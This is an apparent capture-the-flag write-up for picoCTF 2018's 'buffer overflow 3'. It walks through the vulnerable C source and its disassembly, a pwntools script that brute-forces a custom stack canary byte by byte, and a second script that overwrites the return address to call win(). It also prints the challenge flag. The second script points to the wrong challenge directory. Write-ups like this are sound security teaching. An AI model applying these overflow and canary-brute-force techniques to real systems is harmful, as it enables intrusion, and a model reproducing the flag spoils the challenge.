# Problem
It looks like Dr. Xernon added a stack canary to this [program](https://2018shell1.picoctf.com/static/2d5da78bcb5e281180e5aa6d21852b58/vuln) to protect against buffer overflows. Do you think you can bypass the protection and get the flag? You can find it in /problems/buffer-overflow-3_1_2e6726e5326a80f8f5a9c350284e6c7f. [Source](https://2018shell1.picoctf.com/static/2d5da78bcb5e281180e5aa6d21852b58/vuln.c).

## Hints:
Maybe there's a smart way to brute-force the canary?

## Solution:

Lets download the files:
```bash
wget https://2018shell1.picoctf.com/static/2d5da78bcb5e281180e5aa6d21852b58/vuln
wget https://2018shell1.picoctf.com/static/2d5da78bcb5e281180e5aa6d21852b58/vuln.c
chmod +x ./vuln
```

First, we investigate the source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 32
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("Canary is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  int i;
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

Now there is an implementation of [buffer overflow protection](https://en.wikipedia.org/wiki/Buffer_overflow_protection). When we enter ```vuln()``` the canary value is being read from the file to the end of the [stack frame](https://en.wikipedia.org/wiki/Call_stack#Stack_and_frame_pointers), and before returning we make sure the value have not changed.

This makes the overriding of the return address harder.

First we need to calculate the offset of the canary. Then we brute force it char by char. Finally, we override the return address.

```gdb
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x080487c3 <+0>: push   ebp
   0x080487c4 <+1>: mov    ebp,esp
   0x080487c6 <+3>: sub    esp,0x58
   0x080487c9 <+6>: mov    DWORD PTR [ebp-0xc],0x0
   0x080487d0 <+13>:  mov    eax,ds:0x804a058
   0x080487d5 <+18>:  mov    DWORD PTR [ebp-0x10],eax
   0x080487d8 <+21>:  sub    esp,0xc
   0x080487db <+24>:  push   0x8048a90
   0x080487e0 <+29>:  call   0x8048500 <printf@plt>
   0x080487e5 <+34>:  add    esp,0x10
   0x080487e8 <+37>:  jmp    0x8048815 <vuln+82>
   0x080487ea <+39>:  mov    eax,DWORD PTR [ebp-0xc]
   0x080487ed <+42>:  lea    edx,[ebp-0x50]
   0x080487f0 <+45>:  add    eax,edx
   0x080487f2 <+47>:  sub    esp,0x4
   0x080487f5 <+50>:  push   0x1
   0x080487f7 <+52>:  push   eax
   0x080487f8 <+53>:  push   0x0
   0x080487fa <+55>:  call   0x80484f0 <read@plt>
   0x080487ff <+60>:  add    esp,0x10
   0x08048802 <+63>:  lea    edx,[ebp-0x50]
   0x08048805 <+66>:  mov    eax,DWORD PTR [ebp-0xc]
   0x08048808 <+69>:  add    eax,edx
   0x0804880a <+71>:  movzx  eax,BYTE PTR [eax]
   0x0804880d <+74>:  cmp    al,0xa
   0x0804880f <+76>:  je     0x804881d <vuln+90>
   0x08048811 <+78>:  add    DWORD PTR [ebp-0xc],0x1
   0x08048815 <+82>:  cmp    DWORD PTR [ebp-0xc],0x1f
   0x08048819 <+86>:  jle    0x80487ea <vuln+39>
   0x0804881b <+88>:  jmp    0x804881e <vuln+91>
   0x0804881d <+90>:  nop
   0x0804881e <+91>:  sub    esp,0x4
   0x08048821 <+94>:  lea    eax,[ebp-0x54]
   0x08048824 <+97>:  push   eax
   0x08048825 <+98>:  push   0x8048ac2
   0x0804882a <+103>: lea    eax,[ebp-0x50]
   0x0804882d <+106>: push   eax
   0x0804882e <+107>: call   0x80485a0 <__isoc99_sscanf@plt>
   0x08048833 <+112>: add    esp,0x10
   0x08048836 <+115>: sub    esp,0xc
   0x08048839 <+118>: push   0x8048ac5
   0x0804883e <+123>: call   0x8048500 <printf@plt>
   0x08048843 <+128>: add    esp,0x10
   0x08048846 <+131>: mov    eax,DWORD PTR [ebp-0x54]
   0x08048849 <+134>: sub    esp,0x4
   0x0804884c <+137>: push   eax
   0x0804884d <+138>: lea    eax,[ebp-0x30]
   0x08048850 <+141>: push   eax
   0x08048851 <+142>: push   0x0
   0x08048853 <+144>: call   0x80484f0 <read@plt>
   0x08048858 <+149>: add    esp,0x10
   0x0804885b <+152>: sub    esp,0x4
   0x0804885e <+155>: push   0x4
   0x08048860 <+157>: push   0x804a058
   0x08048865 <+162>: lea    eax,[ebp-0x10]
   0x08048868 <+165>: push   eax
   0x08048869 <+166>: call   0x8048540 <memcmp@plt>
   0x0804886e <+171>: add    esp,0x10
   0x08048871 <+174>: test   eax,eax
   0x08048873 <+176>: je     0x804888f <vuln+204>
   0x08048875 <+178>: sub    esp,0xc
   0x08048878 <+181>: push   0x8048ad0
   0x0804887d <+186>: call   0x8048570 <puts@plt>
   0x08048882 <+191>: add    esp,0x10
   0x08048885 <+194>: sub    esp,0xc
   0x08048888 <+197>: push   0xffffffff
   0x0804888a <+199>: call   0x8048580 <exit@plt>
   0x0804888f <+204>: sub    esp,0xc
   0x08048892 <+207>: push   0x8048b08
   0x08048897 <+212>: call   0x8048570 <puts@plt>
   0x0804889c <+217>: add    esp,0x10
   0x0804889f <+220>: mov    eax,ds:0x804a050
   0x080488a4 <+225>: sub    esp,0xc
   0x080488a7 <+228>: push   eax
   0x080488a8 <+229>: call   0x8048510 <fflush@plt>
   0x080488ad <+234>: add    esp,0x10
   0x080488b0 <+237>: nop
   0x080488b1 <+238>: leave  
   0x080488b2 <+239>: ret    
End of assembler dump.
```

We can see that ```buf``` is at $ebp-0x30, and ```canary``` is at $ebp-0x10. We start override from the 33rd byte.

Lets brute force the canary:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = ''
pw = ''

canary = ''

if not debug:
  s = ssh(host = '2018shell1.picoctf.com', user=user, password=pw)

  s.set_working_directory('/problems/buffer-overflow-3_1_2e6726e5326a80f8f5a9c350284e6c7f')

while len(canary) < 4:
  for i in range(256):
    if debug:
      p = process('./vuln')
    else:
      p = s.process('./vuln')

    p.recvuntil('> ')
    p.sendline('{}'.format(32 + 1 + len(canary)))
    p.recvuntil('> ')
    p.sendline('A' * 32 + canary + '{}'.format(chr(i)))
    l = p.recvline()

    if '*** Stack Smashing Detected' not in l:
      canary += chr(i)

      log.info('Partial canary: {}'.format(canary))
      
      break

log.info('Found canary: {}'.format(canary))
```

Found canary: ```4xV,```

Now we proceed like before.
Lets debug:
```bash
gdb -x ./vuln


GNU gdb (Ubuntu 8.0.1-0ubuntu1) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./vuln...(no debugging symbols found)...done.
gdb-peda$ run
Starting program: /home/roee/CTFs-Writeups/picoCTF-2018/Binary/11-buffer_overflow_3-450/vuln 
How Many Bytes will You Write Into the Buffer?
> 300
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4xV,AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
Ok... Now Where's the Flag?

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xf7f9a894 --> 0x0 
EDX: 0x0 
ESI: 0x1 
EDI: 0xf7f99000 --> 0x1d1d70 
EBP: 0x44444444 ('DDDD')
ESP: 0xffffd040 ("FFFFGGGGHHHHIIIIJJJJKKKK\n")
EIP: 0x45454545 ('EEEE')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x45454545
[------------------------------------stack-------------------------------------]
0000| 0xffffd040 ("FFFFGGGGHHHHIIIIJJJJKKKK\n")
0004| 0xffffd044 ("GGGGHHHHIIIIJJJJKKKK\n")
0008| 0xffffd048 ("HHHHIIIIJJJJKKKK\n")
0012| 0xffffd04c ("IIIIJJJJKKKK\n")
0016| 0xffffd050 ("JJJJKKKK\n")
0020| 0xffffd054 ("KKKK\n")
0024| 0xffffd058 --> 0xa ('\n')
0028| 0xffffd05c --> 0xf7ddf986 (<__libc_start_main+246>: add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x45454545 in ?? ()
gdb-peda$ 
```

We know that ```EEEE``` overrides the return address.

Now lets write a simple python script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = ''
pw = ''

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2018shell1.picoctf.com', user=user, password=pw)
  s.set_working_directory('/problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa')
  p = s.process('./vuln')

binary = ELF('./vuln')

canary = '4xV,'

print p.recvuntil('>')
p.sendline('300')
print p.recvuntil('>')
p.sendline('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + canary + 'AAAABBBBCCCCDDDD' + p32(binary.symbols['win']))
print p.recvall()
```

**Note: the canary file is being read with a relative path, we can forge this file in the home directory and bypass the whole thing... see [leak-me](https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/Binary/03-leak_me-200/solution.md)**

Flag: picoCTF{eT_tU_bRuT3_F0Rc3_4214775b}